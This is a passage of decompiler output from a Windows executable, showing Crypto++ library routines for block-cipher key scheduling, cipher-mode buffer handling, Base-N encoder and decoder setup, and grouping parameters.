          v82 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v79]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[BYTE1(v78)]] + 1) ^ v80;
          v83 = v68[v81];
          v84 = (int *)&v68[v81];
          *v79 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v84]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[BYTE1(v83)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(v68[v81] >> 16)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[v68[v81] >> 24]] + 3);
          *v84 = v82;
          v85 = v68[v70];
          v86 = (int *)&v68[v70];
          v87 = v68[v71];
          v88 = (int *)&v68[v71];
          v89 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v88]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[BYTE1(v87)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(v68[v71] >> 16)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[v68[v71] >> 24]] + 3);
          *v88 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v86]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[BYTE1(v85)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(v68[v70] >> 16)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[v68[v70] >> 24]] + 3);
          v90 = &v68[v71 + 1];
          *v86 = v89;
          v91 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v90]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(*(_WORD *)v90 >> 8)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(*v90 >> 16)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*v90 >> 24]] + 3);
          v92 = &v68[(unsigned int)(v70 + 1)];
          v43 += 4;
          v69 = (unsigned int)(v69 - 4);
          v71 += 4;
          v70 = (unsigned int)(v70 - 4);
          *v90 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v92]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(*(_WORD *)v92 >> 8)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(*v92 >> 16)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*v92 >> 24]] + 3);
          *v92 = v91;
        }
        while ( v43 < (unsigned int)v69 );
      }
      v93 = (int *)&v68[v43];
      v94 = v43 + 1;
      v95 = v68[v94];
      *v93 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v93]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(*(_WORD *)v93 >> 8)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)((unsigned int)*v93 >> 16)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned int)*v93 >> 24]] + 3);
      v96 = (int *)&v68[v94];
      v97 = v43 + 2;
      v98 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v96]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[BYTE1(v95)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[BYTE2(v95)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[HIBYTE(v95)]] + 3);
      v99 = v68[v97];
      *v96 = v98;
      v100 = (int *)&v68[v97];
      v101 = v43 + 3;
      v102 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v100]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[BYTE1(v99)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[BYTE2(v99)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[HIBYTE(v99)]] + 3);
      v103 = v68[v101];
      *v100 = v102;
      v68[v101] = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[LOBYTE(v68[v101])]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[BYTE1(v103)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[BYTE2(v103)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[HIBYTE(v103)]] + 3);
      v104 = _byteswap_ulong(*v68);
      *v68 = _byteswap_ulong(v68[4 * *(_DWORD *)(v5 + 24)]);
      v68[4 * *(_DWORD *)(v5 + 24)] = v104;
      v105 = _byteswap_ulong(v68[1]);
      v68[1] = _byteswap_ulong(v68[4 * *(_DWORD *)(v5 + 24) + 1]);
      v68[4 * *(_DWORD *)(v5 + 24) + 1] = v105;
      v106 = _byteswap_ulong(v68[2]);
      v68[2] = _byteswap_ulong(v68[4 * *(_DWORD *)(v5 + 24) + 2]);
      v68[4 * *(_DWORD *)(v5 + 24) + 2] = v106;
      v107 = _byteswap_ulong(v68[3]);
      v68[3] = _byteswap_ulong(v68[4 * *(_DWORD *)(v5 + 24) + 3]);
      v68[4 * *(_DWORD *)(v5 + 24) + 3] = v107;
    }
    if ( !byte_1400DBD4C )
      sub_14006AA50();
    if ( byte_1400DBD51 )
      sub_140061550(
        (unsigned __int64)(v68 + 4),
        (unsigned __int64)(v68 + 4),
        (unsigned int)(16 * (*(_DWORD *)(v5 + 24) - 1)));
  }
}
// 1400DB480: using guessed type char byte_1400DB480;
// 1400DB481: using guessed type char byte_1400DB481;
// 1400DB4A1: using guessed type int dword_1400DB4A1[];
// 1400DBD4C: using guessed type char byte_1400DBD4C;
// 1400DBD51: using guessed type char byte_1400DBD51;

//----- (0000000140066730) ----------------------------------------------------
__int64 __fastcall sub_140066730(__int64 a1, const void *a2, rsize_t a3)
{
  __int64 v3; // rbx
  void *v4; // rcx

  v3 = a1;
  v4 = *(void **)(a1 - 8);
  if ( a2 )
    memcpy_s(v4, a3, a2, a3);
  else
    memset(v4, 0, a3);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 32i64))(v3);
}

//----- (0000000140066780) ----------------------------------------------------
void *__fastcall sub_140066780(__int64 a1, __int64 a2, __int64 a3, int a4, unsigned __int64 a5)
{
  size_t v5; // rbx
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rdi
  int v9; // ST28_4
  void *result; // rax
  size_t v11; // r14
  signed int v12; // ST28_4

  v5 = *(unsigned int *)(a1 - 16);
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( a4 )
  {
    v11 = *(unsigned int *)(a1 - 16);
    memcpy(*(void **)(a1 + 24), (const void *)(v11 * (a5 - 1) + a3), v11);
    if ( a5 > 1 )
    {
      v12 = 8;
      (*(void (__fastcall **)(signed __int64, __int64, size_t, size_t, size_t, signed int))(*(_QWORD *)(*(_QWORD *)(v8 - 32) + 8i64)
                                                                                          + 72i64))(
        *(_QWORD *)(v8 - 32) + 8i64,
        v6,
        v11 + v6,
        v11 + v7,
        v11 * (a5 - 1),
        v12);
    }
    (*(void (__fastcall **)(signed __int64, _QWORD, __int64, __int64))(*(_QWORD *)(*(_QWORD *)(v8 - 32) + 8i64) + 24i64))(
      *(_QWORD *)(v8 - 32) + 8i64,
      *(_QWORD *)(v8 - 8),
      v6,
      v7);
    result = memcpy(*(void **)(v8 - 8), *(const void **)(v8 + 24), v11);
  }
  else
  {
    (*(void (__fastcall **)(signed __int64, _QWORD, __int64, __int64))(*(_QWORD *)(*(_QWORD *)(a1 - 32) + 8i64) + 24i64))(
      *(_QWORD *)(a1 - 32) + 8i64,
      *(_QWORD *)(a1 - 8),
      a3,
      a2);
    if ( a5 > 1 )
    {
      v9 = 0;
      (*(void (__fastcall **)(signed __int64, __int64, size_t, size_t, size_t, int))(*(_QWORD *)(*(_QWORD *)(v8 - 32)
                                                                                               + 8i64)
                                                                                   + 72i64))(
        *(_QWORD *)(v8 - 32) + 8i64,
        v7,
        v5 + v6,
        v5 + v7,
        v5 * (a5 - 1),
        v9);
    }
    result = memcpy(*(void **)(v8 - 8), (const void *)(v7 + v5 * (a5 - 1)), v5);
  }
  return result;
}

//----- (00000001400668B0) ----------------------------------------------------
__int64 __fastcall sub_1400668B0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  __int64 v4; // r14
  _QWORD *v5; // rbx
  __int64 v6; // rbp
  unsigned __int64 v7; // rsi
  unsigned __int64 v8; // rdi
  signed int v9; // ST28_4
  __int64 v10; // rcx
  __int64 result; // rax
  __int64 v12; // rcx

  if ( a4 )
  {
    v4 = a2;
    v5 = (_QWORD *)a1;
    v6 = a3;
    v7 = *(unsigned int *)(a1 + 24);
    v8 = a4;
    memcpy(*(void **)(a1 + 80), (const void *)(a4 + a3 - v7), (unsigned int)v7);
    if ( v8 > v7 )
    {
      v9 = 24;
      (*(void (__fastcall **)(signed __int64, unsigned __int64, __int64, unsigned __int64, unsigned __int64, signed int))(*(_QWORD *)(v5[1] + 8i64) + 72i64))(
        v5[1] + 8i64,
        v7 + v6,
        v6,
        v7 + v4,
        v8 - v7,
        v9);
    }
    (*(void (__fastcall **)(signed __int64, __int64, _QWORD, __int64))(*(_QWORD *)(v5[1] + 8i64) + 24i64))(
      v5[1] + 8i64,
      v6,
      v5[4],
      v4);
    v10 = v5[3];
    v5[3] = v5[9];
    v5[9] = v10;
    result = v5[10];
    v12 = v5[4];
    v5[4] = result;
    v5[10] = v12;
  }
  return result;
}

//----- (0000000140066980) ----------------------------------------------------
void __fastcall sub_140066980(__int64 a1)
{
  __int64 v1; // rbx
  unsigned int v2; // eax

  v1 = a1;
  v2 = (*(__int64 (__fastcall **)(signed __int64))(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 32i64))(*(_QWORD *)(a1 + 16) + 8i64);
  sub_140051210(v1 + 24, v2);
  sub_140038C40(v1 + 56, *(unsigned int *)(v1 + 32));
}

//----- (00000001400669C0) ----------------------------------------------------
void __fastcall sub_1400669C0(__int64 a1, unsigned int a2)
{
  char v2; // [rsp+28h] [rbp-80h]
  __int64 v3; // [rsp+38h] [rbp-70h]
  __int64 v4; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v5)(void *); // [rsp+50h] [rbp-58h]
  int v6; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v8; // [rsp+80h] [rbp-28h]
  __int64 v9; // [rsp+88h] [rbp-20h]

  if ( a2 > *(_DWORD *)(a1 + 32) )
  {
    v4 = 15i64;
    v3 = 0i64;
    v2 = 0;
    sub_140004F20(&v2, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v5);
    v5 = &off_1400A8798;
    v6 = 1;
    v9 = 15i64;
    v8 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v5 = &off_1400A8798;
    CxxThrowException(&v5, &_TI3_AVcls_001_CryptoPP__);
  }
  if ( !a2 )
    a2 = *(_DWORD *)(a1 + 32);
  *(_DWORD *)(a1 + 80) = a2;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140066AB0) ----------------------------------------------------
errno_t __fastcall sub_140066AB0(__int64 a1)
{
  __int64 v1; // rdi
  __int64 v2; // r8
  rsize_t v3; // rbx

  v1 = a1;
  (*(void (__fastcall **)(signed __int64, _QWORD, _QWORD, _QWORD))(*(_QWORD *)(*(_QWORD *)(a1 - 32) + 8i64) + 24i64))(
    *(_QWORD *)(a1 - 32) + 8i64,
    *(_QWORD *)(v1 - 8),
    0i64,
    *(_QWORD *)(v1 + 24));
  v2 = *(unsigned int *)(v1 + 32);
  v3 = (unsigned int)(*(_DWORD *)(v1 - 16) - v2);
  memmove_s(*(void **)(v1 - 8), *(_QWORD *)(v1 - 16), (const void *)(*(_QWORD *)(v1 - 8) + v2), v3);
  return memcpy_s(
           (void *)(v3 + *(_QWORD *)(v1 - 8)),
           *(_QWORD *)(v1 - 16) - v3,
           *(const void **)(v1 + 24),
           *(unsigned int *)(v1 + 32));
}

//----- (0000000140066B20) ----------------------------------------------------
__int64 __fastcall sub_140066B20(__int64 a1, __int64 a2, unsigned int a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 result; // rax
  __int64 v7; // rax
  unsigned int v8; // [rsp+30h] [rbp+8h]

  v4 = a1;
  v5 = a4;
  (*(void (__fastcall **)(_QWORD, __int64, _QWORD))(**(_QWORD **)(a1 + 16) + 48i64))(*(_QWORD *)(a1 + 16), a2, a3);
  (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 128i64))(v4);
  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 56i64))(v4);
  if ( (signed int)result < 4 )
  {
    v7 = sub_140038790(v4, v5, (__int64)&v8);
    result = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)v4 + 88i64))(v4, v7, v8);
  }
  return result;
}

//----- (0000000140066B90) ----------------------------------------------------
__int64 __fastcall sub_140066B90(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  char v4; // [rsp+28h] [rbp-80h]
  __int64 v5; // [rsp+38h] [rbp-70h]
  __int64 v6; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v7)(void *); // [rsp+50h] [rbp-58h]
  int v8; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v10; // [rsp+80h] [rbp-28h]
  __int64 v11; // [rsp+88h] [rbp-20h]

  result = (*(__int64 (__fastcall **)(__int64, __int64, const unsigned __int8 **))(*(_QWORD *)a1 + 8i64))(
             a1,
             a3,
             &unsigned char const * `RTTI Type Descriptor');
  if ( !(_BYTE)result )
  {
    v6 = 15i64;
    v5 = 0i64;
    v4 = 0;
    sub_140004F20(&v4, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v7);
    v7 = &off_1400A8798;
    v8 = 1;
    v11 = 15i64;
    v10 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v7 = &off_1400A8798;
    CxxThrowException(&v7, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;
// 1400D90C0: using guessed type const unsigned __int8 *unsigned char const * `RTTI Type Descriptor';

//----- (0000000140066C80) ----------------------------------------------------
__int64 __fastcall sub_140066C80(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  char v4; // [rsp+28h] [rbp-80h]
  __int64 v5; // [rsp+38h] [rbp-70h]
  __int64 v6; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v7)(void *); // [rsp+50h] [rbp-58h]
  int v8; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v10; // [rsp+80h] [rbp-28h]
  __int64 v11; // [rsp+88h] [rbp-20h]

  result = (*(__int64 (__fastcall **)(__int64, __int64, const int **))(*(_QWORD *)a1 + 8i64))(
             a1,
             a3,
             &int const * `RTTI Type Descriptor');
  if ( !(_BYTE)result )
  {
    v6 = 15i64;
    v5 = 0i64;
    v4 = 0;
    sub_140004F20(&v4, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v7);
    v7 = &off_1400A8798;
    v8 = 1;
    v11 = 15i64;
    v10 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v7 = &off_1400A8798;
    CxxThrowException(&v7, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;
// 1400D9378: using guessed type const int *int const * `RTTI Type Descriptor';

//----- (0000000140066D70) ----------------------------------------------------
__int64 __fastcall sub_140066D70(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  char v4; // [rsp+28h] [rbp-80h]
  __int64 v5; // [rsp+38h] [rbp-70h]
  __int64 v6; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v7)(void *); // [rsp+50h] [rbp-58h]
  int v8; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v10; // [rsp+80h] [rbp-28h]
  __int64 v11; // [rsp+88h] [rbp-20h]

  result = (*(__int64 (__fastcall **)(__int64, __int64, void *))(*(_QWORD *)a1 + 8i64))(
             a1,
             a3,
             &CryptoPP::cls_053 `RTTI Type Descriptor');
  if ( !(_BYTE)result )
  {
    v6 = 15i64;
    v5 = 0i64;
    v4 = 0;
    sub_140004F20(&v4, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v7);
    v7 = &off_1400A8798;
    v8 = 1;
    v11 = 15i64;
    v10 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v7 = &off_1400A8798;
    CxxThrowException(&v7, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140066E60) ----------------------------------------------------
int __fastcall sub_140066E60(_DWORD *a1, unsigned __int8 *a2, unsigned int a3, char a4)
{
  unsigned __int64 v4; // rax
  _DWORD *v5; // rsi
  unsigned int v6; // ebx
  unsigned __int8 *v7; // rdi
  _DWORD *v8; // rdx
  char v9; // r14
  unsigned int v10; // ebp
  __int64 v11; // r10
  signed __int64 v12; // rcx

  v4 = (unsigned __int64)(a1 + 256);
  v5 = a1;
  v6 = 0;
  v7 = a2;
  v8 = a1;
  v9 = a4;
  v10 = a3;
  v11 = 0i64;
  v12 = 256i64;
  if ( (unsigned __int64)v8 > v4 )
    v12 = 0i64;
  if ( v12 )
  {
    do
    {
      ++v11;
      *v8 = -1;
      ++v8;
    }
    while ( v11 != v12 );
  }
  if ( a3 )
  {
    do
    {
      if ( v9 && isalpha(*v7) )
      {
        v5[toupper(*v7)] = v6;
        LODWORD(v4) = tolower(*v7);
        v5[(signed int)v4] = v6;
      }
      else
      {
        v4 = *v7;
        v5[v4] = v6;
      }
      ++v6;
      ++v7;
    }
    while ( v6 < v10 );
  }
  return v4;
}

//----- (0000000140066F30) ----------------------------------------------------
void __fastcall sub_140066F30(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rsi
  int v4; // edx
  int i; // eax
  int v6; // eax
  char v7; // [rsp+28h] [rbp-80h]
  __int64 v8; // [rsp+38h] [rbp-70h]
  __int64 v9; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v10)(void *); // [rsp+50h] [rbp-58h]
  int v11; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v13; // [rsp+80h] [rbp-28h]
  __int64 v14; // [rsp+88h] [rbp-20h]

  v2 = a2;
  v3 = a1;
  sub_140066C80(a2, (__int64)"BaseN_Decoder", (__int64)"DecodingLookupArray");
  sub_140058F90(v2, (__int64)"BaseN_Decoder", (__int64)"Log2Base");
  v4 = *(_DWORD *)(v3 + 60);
  if ( (unsigned int)(v4 - 1) > 6 )
  {
    v9 = 15i64;
    v8 = 0i64;
    v7 = 0;
    sub_140004F20(&v7, "BaseN_Decoder: Log2Base must be between 1 and 7 inclusive", 0x39ui64);
    std::exception::exception((std::exception *)&v10);
    v10 = &off_1400A8798;
    v11 = 1;
    v14 = 15i64;
    v13 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v7, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v10 = &off_1400A8798;
    CxxThrowException(&v10, &_TI3_AVcls_001_CryptoPP__);
  }
  *(_QWORD *)(v3 + 68) = 0i64;
  for ( i = v4; i % 8; i += v4 )
    ;
  v6 = i / 8;
  *(_DWORD *)(v3 + 64) = v6;
  sub_140038C40(v3 + 80, v6);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (00000001400670C0) ----------------------------------------------------
void __fastcall sub_1400670C0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  signed int v4; // er9
  signed int v5; // ecx
  int v6; // er8
  char v7; // [rsp+20h] [rbp-88h]
  unsigned __int8 v8; // [rsp+21h] [rbp-87h]
  __int64 v9; // [rsp+28h] [rbp-80h]
  char v10; // [rsp+30h] [rbp-78h]
  __int64 v11; // [rsp+40h] [rbp-68h]
  __int64 v12; // [rsp+48h] [rbp-60h]
  __int64 (__fastcall **v13)(void *); // [rsp+50h] [rbp-58h]
  int v14; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v16; // [rsp+80h] [rbp-28h]
  __int64 v17; // [rsp+88h] [rbp-20h]

  v9 = -2i64;
  v2 = a2;
  v3 = a1;
  sub_140066B90(a2, (__int64)"BaseN_Encoder", (__int64)"EncodingLookupArray");
  sub_140058F90(v2, (__int64)"BaseN_Encoder", (__int64)"Log2Base");
  if ( (unsigned int)(*(_DWORD *)(v3 + 60) - 1) > 6 )
  {
    v12 = 15i64;
    v11 = 0i64;
    v10 = 0;
    sub_140004F20(&v10, "BaseN_Encoder: Log2Base must be between 1 and 7 inclusive", 0x39ui64);
    std::exception::exception((std::exception *)&v13);
    v13 = &off_1400A8798;
    v14 = 1;
    v17 = 15i64;
    v16 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v10, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v13 = &off_1400A8798;
    CxxThrowException(&v13, &_TI3_AVcls_001_CryptoPP__);
  }
  if ( (*(unsigned __int8 (__fastcall **)(__int64, const char *, unsigned __int8 *, unsigned __int8 *))(*(_QWORD *)v2 + 8i64))(
         v2,
         "PaddingByte",
         &unsigned char `RTTI Type Descriptor',
         &v8)
    && (!(*(unsigned __int8 (__fastcall **)(__int64, const char *, bool *, char *))(*(_QWORD *)v2 + 8i64))(
           v2,
           "Pad",
           &bool `RTTI Type Descriptor',
           &v7)
     || v7) )
  {
    v4 = v8;
  }
  else
  {
    v4 = -1;
  }
  *(_DWORD *)(v3 + 56) = v4;
  *(_QWORD *)(v3 + 68) = 0i64;
  v5 = 8;
  v6 = *(_DWORD *)(v3 + 60);
  if ( 8 % v6 )
  {
    do
      v5 += 8;
    while ( v5 % v6 );
  }
  *(_DWORD *)(v3 + 64) = v5 / v6;
  sub_140038C40(v3 + 80, v5 / v6);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;
// 1400D9230: using guessed type bool bool `RTTI Type Descriptor';
// 1400D9538: using guessed type unsigned __int8 unsigned char `RTTI Type Descriptor';

//----- (0000000140067290) ----------------------------------------------------
void __fastcall sub_140067290(rsize_t *a1, __int64 a2)
{
  __int64 v2; // rdi
  rsize_t *v3; // r14
  char v4; // al
  int v5; // edx
  unsigned __int64 v6; // rdi
  void *v7; // rbx
  void *v8; // rcx
  unsigned __int64 v9; // rdi
  void *v10; // rbx
  void *v11; // rcx
  void *v12; // rdx
  void *v13; // rdx
  int v14; // [rsp+20h] [rbp-39h]
  char v15; // [rsp+28h] [rbp-31h]
  void *v16; // [rsp+30h] [rbp-29h]
  unsigned __int64 v17; // [rsp+38h] [rbp-21h]
  rsize_t MaxCount; // [rsp+48h] [rbp-11h]
  void *Src; // [rsp+50h] [rbp-9h]
  char v20; // [rsp+58h] [rbp-1h]
  void *v21; // [rsp+60h] [rbp+7h]
  unsigned __int64 v22; // [rsp+68h] [rbp+Fh]
  rsize_t v23; // [rsp+78h] [rbp+1Fh]
  void *Memory; // [rsp+80h] [rbp+27h]
  __int64 v25; // [rsp+88h] [rbp+2Fh]

  v25 = -2i64;
  v2 = a2;
  v3 = a1;
  v4 = (*(__int64 (__fastcall **)(__int64, const char *, int *, int *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "GroupSize",
         &int `RTTI Type Descriptor',
         &v14);
  v5 = 0;
  if ( v4 )
    v5 = v14;
  v3[12] = v5;
  MaxCount = 0i64;
  Src = 0i64;
  v16 = 0i64;
  v17 = 0i64;
  v15 = 0;
  v23 = 0i64;
  Memory = 0i64;
  v21 = 0i64;
  v22 = 0i64;
  v20 = 0;
  if ( v5 )
    sub_140066D70(v2, (__int64)"Grouper", (__int64)"Separator");
  else
    (*(void (__fastcall **)(__int64, const char *, void *, char *))(*(_QWORD *)v2 + 8i64))(
      v2,
      "Separator",
      &CryptoPP::cls_053 `RTTI Type Descriptor',
      &v15);
  (*(void (__fastcall **)(__int64, const char *, void *, char *))(*(_QWORD *)v2 + 8i64))(
    v2,
    "Terminator",
    &CryptoPP::cls_053 `RTTI Type Descriptor',
    &v20);
  if ( v15 )
  {
    v6 = MaxCount;
    v7 = Src;
  }
  else
  {
    v6 = v17;
    v7 = v16;
  }
  sub_140038C40((__int64)(v3 + 6), v6);
  v8 = (void *)v3[8];
  if ( v8 && v7 && v6 )
    memcpy_s(v8, v3[7], v7, v6);
  if ( v20 )
  {
    v9 = v23;
    v10 = Memory;
  }
  else
  {
    v9 = v22;
    v10 = v21;
  }
  sub_140038C40((__int64)(v3 + 9), v9);
  v11 = (void *)v3[11];
  if ( v11 && v10 && v9 )
    memcpy_s(v11, v3[10], v10, v9);
  v3[13] = 0i64;
  v12 = Memory;
  memset(Memory, 0, v23);
  free(v12);
  v13 = Src;
  memset(Src, 0, MaxCount);
  free(v13);
}
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';

//----- (0000000140067440) ----------------------------------------------------
__int64 __fastcall sub_140067440(__int64 a1, __int64 a2, unsigned __int64 a3, int a4, char a5)
{
  char v5; // bp
  __int64 v6; // rbx
  int v7; // ecx
  int v8; // er15
  unsigned __int64 v9; // rsi
  __int64 v10; // r14
  int v11; // ecx
  unsigned __int64 v12; // rdx
  unsigned int v13; // edi
  int v14; // er8
  _BYTE *v15; // rdx
  _BYTE *v16; // rdx
  int v17; // eax
  __int64 *v18; // rax
  unsigned __int64 v19; // rcx
  __int64 *v21; // rax
  unsigned __int64 v22; // rcx
  __int64 v23; // [rsp+20h] [rbp-58h]
  __int64 v24; // [rsp+40h] [rbp-38h]
  unsigned __int64 v25; // [rsp+80h] [rbp+8h]

  v5 = a5;
  v6 = a1;
  v7 = *(_DWORD *)(a1 + 40);
  v8 = a4;
  v9 = a3;
  v10 = a2;
  if ( !v7 )
  {
    *(_QWORD *)(v6 + 32) = 0i64;
    goto LABEL_6;
  }
  v11 = v7 - 1;
  if ( v11 )
  {
    if ( v11 != 1 )
      return 0i64;
  }
  else
  {
LABEL_19:
    LODWORD(v23) = 0;
    if ( sub_14005A600(v6, 1, *(_QWORD *)(v6 + 96), *(signed int *)(v6 + 64), v23, v5, (__int64)&qword_1400D8080) )
    {
      v18 = (__int64 *)&v25;
      v19 = *(signed int *)(v6 + 64) - *(_QWORD *)(v6 + 32);
      v24 = 1i64;
      v25 = v19;
      if ( v19 <= 1 )
        v18 = &v24;
      return *v18;
    }
    *(_QWORD *)(v6 + 68) = 0i64;
LABEL_6:
    while ( 1 )
    {
      v12 = *(_QWORD *)(v6 + 32);
      if ( v12 >= v9 )
        break;
      v13 = *(_DWORD *)(*(_QWORD *)(v6 + 48) + 4i64 * *(unsigned __int8 *)(v12 + v10));
      *(_QWORD *)(v6 + 32) = v12 + 1;
      if ( v13 < 0x100 )
      {
        if ( !*(_DWORD *)(v6 + 68) && !*(_DWORD *)(v6 + 72) )
          memset(*(void **)(v6 + 96), 0, *(signed int *)(v6 + 64));
        v14 = *(_DWORD *)(v6 + 72) + *(_DWORD *)(v6 + 60);
        if ( v14 > 8 )
        {
          v16 = (_BYTE *)(*(_QWORD *)(v6 + 96) + *(signed int *)(v6 + 68));
